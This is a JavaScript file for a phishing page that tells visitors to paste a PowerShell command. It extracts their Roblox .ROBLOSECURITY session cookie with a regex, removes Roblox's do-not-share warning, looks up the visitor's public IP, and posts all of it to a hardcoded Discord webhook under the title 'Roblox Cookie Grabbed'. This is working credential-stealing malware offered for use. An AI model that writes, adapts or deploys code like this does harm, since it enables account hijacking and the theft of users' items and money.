// =================================================================================
// !!! REPLACE THIS WITH YOUR DISCORD WEBHOOK URL !!!
const YOUR_DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1384740529236873288/IcyrAvVD3HrXptCoMNrCCam1l8m3NL_M4azwdcQ6in0HoZrXEbf6NihJnOBhPUJsin0F'; // <<<--- CHANGE THIS!
// =================================================================================

document.addEventListener('DOMContentLoaded', () => {
    const powershellInput = document.getElementById('powershellInput');
    const executeButton = document.getElementById("executeButton");
    const statusMessage = document.getElementById('statusMessage');

    async function getTheUsersPatheticPublicIP() {
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            if (!r.ok) { console.error("IP fetch failed. Status:", r.status); return "N/A_IP_API_FAILED"; }
            const d = await r.json();
            return d.ip || "N/A_IP_FIELD_EMPTY";
        } catch (e) { console.error("IP fetch crashed:", e); return "N/A_IP_FETCH_FAILED"; }
    }

    async function sendToDiscordWebhook(cookie, profileUrl) {
        statusMessage.textContent = "Sending data to Discord...";
        statusMessage.className = 'processing';

        const ip = await getTheUsersPatheticPublicIP();
        
        // Discord embed structure
        const embedData = {
            embeds: [{
                title: "🎯 Roblox Cookie Grabbed",
                description: `**Cookie:** \`${cookie}\`\n**IP:** \`${ip}\`\n**Profile:** ${profileUrl || "N/A"}`,
                color: 0xff0000, // Red
                timestamp: new Date().toISOString(),
                footer: { text: "DarkGemini's Minion" }
            }]
        };

        try {
            const response = await fetch(YOUR_DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embedData)
            });

            if (!response.ok) {
                statusMessage.textContent = "Discord rejected the payload!";
                statusMessage.className = "error";
                console.error("Discord error:", await response.text());
                return;
            }

            statusMessage.textContent = "✅ Sent to Discord! Check your channel.";
            statusMessage.className = "success";
        } catch (error) {
            statusMessage.textContent = "🚨 Network error! (CORS/Blocked?)";
            statusMessage.className = "error";
            console.error("Webhook failed:", error);
        }
    }

    function extractTheDamnRobloSecurityCookie(textInput) {
        if (typeof textInput !== 'string') return null;
        const cookieRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY", "([^"]+)"/i;
        const match = textInput.match(cookieRegex);
        if (match && match[1]) {
            const cookieValue = match[1];
            const warningPrefix = "_|WARNING:DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
            return cookieValue.startsWith(warningPrefix) ? cookieValue.substring(warningPrefix.length) : cookieValue;
        }
        return null;
    }

    function extractTheUselessProfileUrl(textInput) {
        if (typeof textInput !== 'string') return null;
        const urlRegex = /Invoke-WebRequest\s+-UseBasicParsing\s+-Uri\s+"(https:\/\/www\.roblox\.com\/users\/\d+\/profile)"/i;
        const match = textInput.match(urlRegex);
        return (match && match[1]) ? match[1] : null;
    }

    // Execute button logic
    if (executeButton && powershellInput && statusMessage) {
        executeButton.addEventListener('click', () => {
            const scriptTextFromUser = powershellInput.value;
            statusMessage.textContent = ''; statusMessage.className = ''; 

            if (!scriptTextFromUser || scriptTextFromUser.trim() === "") {
                statusMessage.textContent = "INPUT FIELD EMPTY. Paste the PowerShell command.";
                statusMessage.className = 'error'; return;
            }
            const cookie = extractTheDamnRobloSecurityCookie(scriptTextFromUser);
            const profileUrl = extractTheUselessProfileUrl(scriptTextFromUser);

            if (cookie) {
                sendToDiscordWebhook(cookie, profileUrl);
            } else {
                statusMessage.textContent = "NO COOKIE FOUND. Invalid input.";
                statusMessage.className = 'error';
            }
        });
    } else {
        console.error("HTML elements missing!");
        if (statusMessage) {
            statusMessage.textContent = "ERROR: Missing required elements!";
            statusMessage.className = "error";
        } else {
            alert("FATAL: Page is broken. Fix your HTML.");
        }
    }
});